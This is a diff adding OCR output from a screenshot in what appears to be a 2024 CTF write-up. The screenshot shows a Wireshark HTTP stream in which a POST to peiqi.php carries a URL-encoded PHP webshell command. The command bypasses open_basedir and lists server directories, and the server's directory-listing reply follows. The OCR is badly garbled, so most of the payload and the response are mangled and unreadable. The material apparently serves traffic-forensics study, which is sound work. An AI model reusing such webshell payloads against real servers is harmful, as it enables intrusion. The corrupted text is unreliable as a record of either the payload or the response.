@@ -1,0 +1,44 @@
+# OCR: 49b01778f59ac0ec3440155600f1cae3.jpg
+# 来源: .\02-WriteUp\2024\49b01778f59ac0ec3440155600f1cae3.jpg
+# 引擎: tesseract(chi_sim+eng)
+# 生成: 2026-08-31 15:28
+
+(Mi Wireshark ‘8 HTTP if (tep.stream eq 134) -tepdump ticap - ao x
+POST /peiqi.php HTTP/2.1
+Most: 222.2.2.160
+‘Accept-Encoding: gzip, deflate
+User-Agent: Opera/9.80 (Windows NT 5.13 U; zh-tw) Presto/2.
+Content-Type: application/x-sww-form-urlencoded
+Content-Length: 1587
+Connection: close
+131 Version/11.10
+0bde7e02574c3=Lcl 3d3dy93d34yb2901343dyS0cHHlob3AuY29tL2FwcGxpY2FOAKSULNAIONSDSpeiql=a¥4Dini_set(K22dLsplay_errorsK22K2CK20K220K22)KI64Oset_tine_Linit(O)SIEK2opdieKIOKsOini_get(%
+220pen_basedir&22)X3Bi  X2dopdir)X20%7EX240parrRS0preg_split X22%2°RSCXSCRSCRSCETCASCX2FR2FA2IE2CK2Sopdir )RSER2AOcIXSOdI name (X24 SERVERRSEXZISCRIPT_FILENANER22¥5D) X36R2Atadi rR3
+R22. 36B672%22%38%4onkdir (X24tedir)X3BY40chdir (A2studir)X3BXAGini_set (X22open_basedirX22¥2CA22. .422)X38For (X24i8300LIBX2AINSC Si zeoF (X2oparr)AIBXLAINDEXDE)X7BAOChdir (422. .422)%3
+BE7D40ini_set (X220pen_basedirX22%2C42242F422) XSBL40rmdir(2Aocud _A22K2FX22..A24tndir)X3BXTORSB Funct ionkz0asenc (X2¢out )X7Breturnk2824outXSBX70X36  unct ionk2easoutput ()X7BX240utput
+/x300b_get_contents()X380b_end_clean( )¥38echo20X221b%22. K22236422%38echoX20¥4dasenc (2soutput) K3Be choK2OK22baac FOK22 .A22Lec61dKIEIB¥7D0b_starct ( )SIBtryRTBK2OKIDbASeE. decode (su
+bstr(Sa4_PosTAse%220@bdc7ea2574c3%22¥50%2C2) )R3B424F%30Esopendir (%240)¥38if (324FX30S3DIULL)X7Becho  X22ERRORYSARZFRIFR2OPathE20Miot320F ound2e0rS20No%20Permission!%22)X36%7De1se%7
+‘8424NSDIULLN38%241X3DNULLXABWhi Le (X244%30AAOreaddir (246 ))X7BR24PRIDK240 .X2ANAIBKI4TXADAAOdate (322¥-m-dAZOHADAIN2AcK22%2CAAGF lent ime (424P) )SIBNAOAIAEXSDcubstr (baze_convert (S40F
+Aeperms (24 )X2c16%2CB) K2C -4) X3BR24RESDR2ZNOGRZ2 .RZ4T R22KOOKZ2.N4OFilesize (324) 522809422. X24E .522KOARZZESBAF (S40is_dir(24P)) 24H RIORZAN 522¥2PH22_R2ARAIBEL seRLOATAL RIDA
+_$24RKSBR7DechoH2ORDAN, 3281 XSBRAOCLosedir (X24F )SSER7ORIBY7OcatCch (Except ionk20X24e )¥7Becho20R22ERRORESARIFRIFA22. R2de-R3EgetMes sage ()XS8X7ORSGasout put )S36die()ESBMTTP/1.1 200 OK
+Server: ngine
+Date: Fri, 04 Mar 2022 23 6
+Content-Type: text/html; charset=UTF-8
+Transfer-Encoding: chunked
+Connection: close
+‘Vary: Accept-encoding
+Content-Encoding: gzip
+E 0755
+防 0755
+E e755
+common 0755
+home/ 0755
+mobiles s
+chtaccess 2755
+s
+0755
+0755
+1919
+E
+s
+s
